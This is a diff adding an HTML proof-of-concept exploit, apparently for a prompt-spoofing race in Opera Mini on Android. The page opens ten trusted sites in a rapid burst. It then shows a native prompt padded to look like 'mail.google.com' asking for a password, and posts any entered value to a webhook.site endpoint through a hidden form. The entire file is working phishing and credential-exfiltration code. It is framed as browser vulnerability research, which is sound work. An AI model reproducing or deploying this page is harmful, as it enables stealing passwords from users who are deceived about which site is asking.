@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Semi-UXSS Race PoC (Opera Mini, Android)</title>
+  <style>
+    html, body { margin:0; height:100%; background:#111; color:#fff; font-family:system-ui; display:grid; place-items:center; }
+    button { padding:14px 22px; font-size:16px; border:0; border-radius:10px; cursor:pointer; background:#e63946; color:#fff; }
+    button:hover { filter:brightness(1.1); }
+    #status { margin-top:16px; color:#ddd; text-align:center; max-width:680px; }
+    code { background:#222; padding:2px 6px; border-radius:6px; }
+  </style>
+</head>
+<body>
+  <div>
+    <h1 style="margin:0 0 8px 0; font-size:20px;">Semi-UXSS via window.open() Race</h1>
+    <p style="margin:0 0 16px 0;">Tap once to open 10 trusted domains in a burst, then trigger a native prompt.</p>
+    <button id="go">Launch Race</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    // ======= Configure your sink (optional) =======
+    // Use a webhook endpoint you control; form POST avoids CORS issues.
+    const SINK_URL = "https://webhook.site/2c1d7ce8-a03c-4f27-9b1c-8919a32bd492"; // replace with your webhook.site URL if desired
+
+    // 10 high-reputation targets; use lightweight endpoints to load fast.
+    const TARGETS = [
+      "https://www.google.com/csi",
+      "https://www.wikipedia.org/",
+      "https://www.youtube.com/robots.txt",
+      "https://www.apple.com/contact/",
+      "https://www.microsoft.com/",
+      "https://www.amazon.com/robots.txt",
+      "https://www.instagram.com/",
+      "https://www.yahoo.com/",
+      "https://www.reddit.com/robots.txt",
+      "https://developer.mozilla.org/"
+    ];
+
+    const statusEl = document.getElementById("status");
+
+    function openBurst(count = 10) {
+      const handles = [];
+      let opened = 0;
+
+      for (let i = 0; i < count; i++) {
+        const url = TARGETS[i % TARGETS.length];
+
+        // Small jitter to increase race variance
+        const delay = i * 55 + Math.floor(Math.random() * 35);
+
+        setTimeout(() => {
+          try {
+            const h = window.open(url, "_blank");
+            if (h) {
+              handles.push(h);
+              opened++;
+            }
+          } catch (_) { /* ignore */ }
+        }, delay);
+      }
+
+      // Report after the burst window
+      setTimeout(() => {
+        statusEl.innerHTML = `Opened (attempted): ${count}. Opened (handled): ${opened}.<br/>` +
+          `A native prompt will fire shortly—timed to when the user perceives trusted pages are loading.`;
+      }, count * 60 + 200);
+
+      return handles;
+    }
+
+    function firePromptAndExfil(handles) {
+      // Prompt shortly after new tabs are opened to maximize UX confusion.
+      setTimeout(() => {
+        // Attacker-controlled text mimicking a trusted origin
+        const msg = "mail.google.com says                                                                Password:";
+        const p = prompt(msg, "");
+
+        if (p !== null && p !== "") {
+          // Exfil via form POST to avoid CORS complexities
+          const form = document.createElement("form");
+          form.method = "POST";
+          form.action = SINK_URL;
+
+          const inp = document.createElement("input");
+          inp.type = "hidden";
+          inp.name = "password";
+          inp.value = p;
+
+          form.appendChild(inp);
+          document.body.appendChild(form);
+          form.submit();
+
+          statusEl.innerHTML = "Prompt submitted. If configured, the value was posted to your sink.";
+        } else {
+          statusEl.innerHTML = "Prompt shown; no value captured.";
+        }
+
+        // Best-effort cleanup (mobile may ignore close requests)
+        setTimeout(() => {
+          handles.forEach(h => { try { if (h && !h.closed) h.close(); } catch(_){} });
+        }, 1500);
+      }, 1100 + Math.floor(Math.random() * 300)); // ~1–1.4s after burst start
+    }
+
+    document.getElementById("go").addEventListener("click", () => {
+      statusEl.textContent = "Launching 10-window race…";
+      const handles = openBurst(10);
+      firePromptAndExfil(handles);
+    }, { once: false }); // keep clickable for repeated tests
+  </script>
+</body>
+</html>
